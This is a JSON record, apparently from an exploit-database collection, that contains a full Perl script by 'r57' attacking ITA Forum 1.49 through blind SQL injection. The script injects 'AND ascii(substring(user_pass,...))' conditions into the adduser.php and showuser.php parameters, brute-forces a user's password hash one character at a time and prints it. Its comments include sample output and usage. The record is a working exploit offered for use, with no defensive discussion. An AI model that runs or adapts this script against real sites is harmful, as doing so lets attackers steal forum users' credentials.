{
  "id": "754",
  "title": "ITA Forum 1.49 - SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\nuse LWP::UserAgent;\r\n\r\n# ITA Forum 1.49 sql injection exploit with one char bruteforce by 1dt.w0lf // r57\r\n# \r\n# ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\r\n# example:\r\n# r57ita.pl http://127.0.0.1/ITA/ admin 0\r\n# [!] Exploiting adduser.php\r\n# Please wait...\r\n# [xxxxxxxxxxxxxxxx]\r\n#\r\n# USER_NAME: admin\r\n# USER_PASS: 340878063a81cd71\r\n#\r\n# example2:\r\n# r57ita.pl http://127.0.0.1/ITA/ admin 1\r\n# [!] Exploiting showuser.php\r\n# Please wait...\r\n# [xxxxxxxxxxxxxxxx]\r\n#\r\n# USER_NAME: admin\r\n# USER_PASS: 340878063a81cd71\r\n# ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::\r\n# greets2:\r\n# foster and all ghc members\r\n\r\n$path     = $ARGV[0];\r\n$username = $ARGV[1];\r\n$target   = $ARGV[2];\r\n\r\n$s_num = 1;\r\n$|++;\r\n\r\nif (@ARGV < 2) { &usage; }\r\n\r\nif($target) \r\n { \r\n $string = $username;\r\n $path = $path.\"showuser.php\"; \r\n print \" [!] Exploiting showuser.php\\r\\n\"; \r\n }\r\nelse \r\n { \r\n $string = \"&#1069;&#1090;&#1086;&#1090; &#1083;&#1086;&#1075;&#1080;&#1085; &#1091;&#1078;&#1077; &#1079;&#1072;&#1085;&#1103;&#1090;!\";\r\n $path = $path.\"adduser.php\"; \r\n print \" [!] Exploiting adduser.php\\r\\n\"; \r\n }\r\n\r\nprint \" Please wait...\\r\\n\";\r\nprint \" [\";\r\n\r\nwhile(1)\r\n{\r\nif(&found(47,58)==0) { &found(96,122); } \r\n$char = $i;\r\nif ($char==\"0\") \r\n { \r\n print qq{] \r\n \r\n USER_NAME: $username\r\n USER_PASS: $allchar\r\n };\r\n exit(); \r\n }\r\nelse \r\n { \r\n print \"x\"; \r\n $allchar .= chr($char); \r\n }\r\n$s_num++;\r\n}\r\n\r\nsub found($$)\r\n {\r\n my $fmin = $_[0];\r\n my $fmax = $_[1];\r\n if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }\r\n \r\n $r = int($fmax - ($fmax-$fmin)/2);\r\n $check = \" BETWEEN $r AND $fmax\";\r\n if ( &check($check) ) { &found($r,$fmax); }\r\n else { &found($fmin,$r); }\r\n }\r\n \r\nsub crack($$)\r\n {\r\n my $cmin = $_[0];\r\n my $cmax = $_[1];\r\n $i = $cmin;\r\n while ($i<$cmax)\r\n  {\r\n  $crcheck = \"=$i\";\r\n  if ( &check($crcheck) ) { return $i; }\r\n  $i++;\r\n  }\r\n $i = 0;\r\n return $i;\r\n }\r\n \r\nsub check($)\r\n {\r\n $n++;\r\n $ccheck = $_[0];\r\n if($target){\r\n $http_query = $path.\"?uid=\".$username.\"\\' AND ascii(substring(user_pass,\".$s_num.\",1))\".$ccheck.\" /*\";\r\n }\r\n else{\r\n $http_query = $path.\"?user_pass1=ghc4ever&user_pass2=ghc4ever&user_email=root\\@microsoft.com&Submit=true&user_login=\".$username.\"\\' AND ascii(substring(user_pass,\".$s_num.\",1))\".$ccheck.\" /*\";\r\n }\r\n # wanna view xpl work?\r\n # print \"\\r\\n$http_query\\r\\n\";\r\n $mcb_reguest = LWP::UserAgent->new() or die;\r\n $res = $mcb_reguest->post($http_query); \r\n @results = $res->content; \r\n \r\n foreach $result(@results)\r\n  {\r\n  if ($result =~ /$string/) { return 1; }\r\n  }\r\n return 0;\r\n }\r\n \r\n\r\nsub usage()\r\n {\r\n print q(\r\n    ITA Forum version <= 1.49 sql injection exploit ver2\r\n ==========================================================\r\n    usage: r57ita.pl [path/to/forum/] [user_name] [target]\r\n  targets:\r\n           0 - adduser.php \r\n           1 - showuser.php\r\n ==========================================================   \r\n     e.g.: r57ita.pl http://blah.com/ admin 0\r\n ==========================================================\r\n           visit www.rst.void.ru for more info\r\n );\r\n exit();\r\n }\r\n\r\n# milw0rm.com [2005-01-13]",
  "url": "https://www.exploit-db.com/exploits/754"
}